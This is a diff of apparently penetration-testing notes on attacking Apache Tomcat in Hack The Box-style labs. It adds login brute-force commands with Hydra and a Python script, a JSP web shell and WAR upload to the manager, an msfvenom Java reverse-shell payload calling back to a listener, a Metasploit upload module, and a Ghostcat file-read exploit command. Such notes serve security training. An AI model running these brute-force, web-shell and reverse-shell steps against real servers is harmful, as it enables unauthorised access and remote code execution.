@@ -6,7 +6,7 @@ Many times if discovered via eyewitness it will be flagged as a High Value Targe
 
 By requesting an invalid page, many times the tomcat server will return the server and version:
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 it can also be determined through the server header in the HTTP response, or simply via nmap scan.&#x20;
 
@@ -162,9 +162,9 @@ check for /manager and /host-manager pages.
 gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 ```
 
-### Login Brute Force
+### Tomcat Vulnerability Scanner
 
-
+{% embed url="https://github.com/p0dalirius/ApacheTomcatScanner" %}
 
 ### Login Brute Force
 
@@ -181,13 +181,23 @@ msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
 ```
 
+Alternatively, you can use this python script to brute force the login portal as well:&#x20;
+
+{% embed url="https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce" %}
+
+`python mgr_brute.py -u users.txt -p pass.txt -U http://10.10.10.194:8080/ -P host-manager/`
+
+Hydra can also be used:&#x20;
+
+`hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html`
+
 ### Tomcat Manager & WAR File Upload
 
-A WAR (Web Application Archive) File is used to quickly deploy web applications and backup storage. Users with the manager-gui role are able to access /manager/html and deploy these files. These can be used to deploy malicious code and gain code execution on the web server.&#x20;
+A WAR (Web Application Archive) File is used to quickly deploy web applications and backup storage. Users with the admin, manager, manager-script roles are able to access /manager/html and deploy these files. These can be used to deploy malicious code and gain code execution on the web server.&#x20;
 
-#### Creating Payload Manually&#x20;
+#### Manual Exploitation&#x20;
 
-gcreate file:&#x20;
+Create your web shell file (Make sure to customize your parameter name)
 
 ```java
 <%@ page import="java.util.*,java.io.*"%>
@@ -236,20 +246,52 @@ Click on `Browse` to select the .war file and then click on `Deploy`.
 
 This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.
 
-<i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i>![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)
+![Tomcat Web Application Manager showing applications list with paths, status, and commands, including '/backup' running with zero sessions.](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)
 
 To access the web shell on the Tomcat server, navigate to `http://web01.inlanefreight.local:8180/backup/cmd.jsp`.
 
-#### Create Payload with MSFVenom
+#### Create a reverse shell Payload with MSFVenom
 
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.7 LPORT=1234 -f war > shell.war`
 
 `nc -nvlp 1234`
 
+Then you would upload and execute your WAR file as demonstrated in the above section.&#x20;
+
 #### Auto-Exploit with Metapsloit
+
+`use exploit/multi/http/tomcat_mgr_upload`
 
 {% embed url="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/" %}
 
 #### JSP web shell
 
 {% embed url="https://github.com/SecurityRiskAdvisors/cmd.jsp" %}
+
+#### Cleanup
+
+Go to the manager page and press "Undeploy" on your malicious WAR project.
+
+
+
+### Known Vulnerabilities&#x20;
+
+#### CVE-2020-1938: Ghostcat
+
+{% embed url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938" %}
+
+All versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable to this unauthenticated FLI vulnerability.
+
+1.  Identify AJP service running:&#x20;
+
+    ```shell-session
+    nmap -sV -p 8009,8080 app-dev.inlanefreight.local
+    ```
+2. Exploit POC here: [https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
+3.  Exploit can only read files and folders within the /webapps folder, so stuff like /etc/passwd wont work. check for web.xml:&#x20;
+
+    ```shell-session
+    python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
+    ```
+4. Using the above section for file structure and interesting files, look for sensitive information.&#x20;
+
